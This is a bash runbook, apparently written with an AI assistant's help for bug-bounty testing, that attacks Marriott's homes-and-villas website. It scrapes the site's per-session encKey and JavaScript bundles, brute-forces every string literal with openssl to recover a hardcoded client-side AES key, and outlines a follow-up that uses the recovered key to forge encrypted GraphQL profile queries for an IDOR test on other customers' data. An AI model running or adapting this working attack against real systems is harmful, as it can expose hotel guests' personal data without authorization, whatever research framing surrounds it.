#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV: recover the static x.gp key (session51)
# Portable: Linux / Pi / Termux.
#
# Scheme: realKey = AES.decrypt(encKey, x.gp); encData = AES.encrypt(graphql, realKey).
# encKey is per-session (in __NEXT_DATA__) and is ITSELF Salted__ (AES). x.gp is a
# CONSTANT JS key. So: get the CURRENT encKey, brute every JS string literal as a
# candidate x.gp, and accept the one(s) whose decrypt(encKey, cand) yields a CLEAN
# printable passphrase (the realKey). x.gp is constant -> recovering it from the
# current (even unauth) encKey is valid; we then use it live with a fresh session.
#
# SAFETY: offline crypto + public page/JS. Nothing committed. Read-only.
# Run: OUTDIR=$HOME/s51 bash runbooks/PI-RUNBOOK-session51-hnv-findgp.sh
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s51
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s51"
  else OUTDIR="$HOME/s51"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"

echo "============================================================"
echo "HNV FIND x.gp  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

curl -s -o "$OUTDIR/home.html" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
EK=$(grep -aoE '"encKey"\s*:\s*"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
[ -z "$EK" ] && { echo "no encKey in homepage __NEXT_DATA__"; exit 1; }
printf '%s' "$EK" > "$OUTDIR/ek.b64"
echo "current encKey: $EK"
echo ""

# download JS, extract candidate literals
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
h=open(os.path.join(O,"home.html"),encoding="utf-8",errors="replace").read()
js=sorted(set(re.findall(r'src=["\']([^"\']+\.m?js)(?:\?[^"\']*)?["\']',h,re.I)))
open(os.path.join(O,"js.txt"),"w").write("\n".join(js)); print(f"{len(js)} js refs")
PYEOF
: > "$OUTDIR/alljs.txt"; i=0
while read -r J && [ $i -lt 16 ]; do
  [ -z "$J" ] && continue
  case "$J" in http*) U="$J";; /*) U="$B$J";; *) U="$B/$J";; esac
  curl -s --max-time 20 -H "User-Agent: $UA" -H "$IDH" "$U" >> "$OUTDIR/alljs.txt" 2>/dev/null || true
  i=$((i+1)); sleep 0.15
done < "$OUTDIR/js.txt"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
js=open(os.path.join(O,"alljs.txt"),encoding="utf-8",errors="replace").read()
c=set(re.findall(r'["\']([ -~]{4,64})["\']', js))
# focus: drop obvious non-keys (urls, css, long sentences with spaces)
c={s for s in c if ' ' not in s and not s.startswith(('http','/','.','#','--','@')) and not s.endswith(('.js','.css','.svg','.png','.woff','.woff2','.json'))}
open(os.path.join(O,"cands.txt"),"w").write("\n".join(sorted(c)))
print(f"{len(c)} candidate literals")
PYEOF
echo ""

echo "═══ BRUTE x.gp (clean-realKey validation) ═══"
HITS=0
while IFS= read -r K; do
  [ -z "$K" ] && continue
  for MD in md5 sha256; do
    out=$(openssl enc -d -aes-256-cbc -md $MD -a -A -pass pass:"$K" -in "$OUTDIR/ek.b64" 2>/dev/null) || continue
    # clean printable, plausible key length, key-like charset
    if [ -n "$out" ] && printf '%s' "$out" | LC_ALL=C grep -qE '^[A-Za-z0-9+/=_@.:-]{8,48}$'; then
      echo "  candidate x.gp=[$K] ($MD)  ->  realKey=[$out]"
      echo "$K|$MD|$out" >> "$OUTDIR/gp-hits.txt"; HITS=$((HITS+1))
    fi
  done
done < "$OUTDIR/cands.txt"
echo ""
echo "  $HITS candidate(s). A real x.gp yields a stable key-like realKey."
echo "  If exactly one clean hit -> that's x.gp + the current realKey."
echo ""
echo "════════════════════════════════════════════"
if [ "$HITS" -gt 0 ]; then
  echo "  Best candidates (saved to gp-hits.txt):"
  sort -u "$OUTDIR/gp-hits.txt" | head -10 | sed 's/^/    /'
  echo ""
  echo "  NEXT: with x.gp known, capture a FRESH authenticated HnV session"
  echo "  (cookies) + that page's encKey; realKey=decrypt(encKey,x.gp); then encrypt"
  echo "  a getProfileDetails query and POST {encData} to test profile IDOR."
else
  echo "  No clean realKey. The realKey may be raw bytes (not a string passphrase),"
  echo "  or x.gp is assembled. Paste the JS that defines the module 'x' whose .gp"
  echo "  is used in decrypt(e,x.gp) and I'll pin it."
fi
echo ""
echo "Evidence: $OUTDIR (NOT committed)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
